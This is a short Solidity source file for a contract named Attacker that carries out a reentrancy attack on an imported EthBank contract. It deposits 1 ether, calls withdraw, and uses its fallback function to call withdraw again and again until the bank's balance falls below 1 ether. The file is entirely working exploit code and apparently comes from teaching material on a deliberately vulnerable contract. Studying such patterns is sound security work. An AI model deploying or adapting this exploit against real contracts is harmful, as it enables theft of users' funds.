// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "./EthBank.sol";

contract Attacker {
    EthBank public ethBank;

    constructor(address _ethBankAddress) {
        ethBank = EthBank(_ethBankAddress);
    }

    // Fallback is called when EthBank sends Ether to this contract.
    fallback() external payable {
        if (address(ethBank).balance >= 1 ether) {
            ethBank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        ethBank.deposit{value: 1 ether}();
        ethBank.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
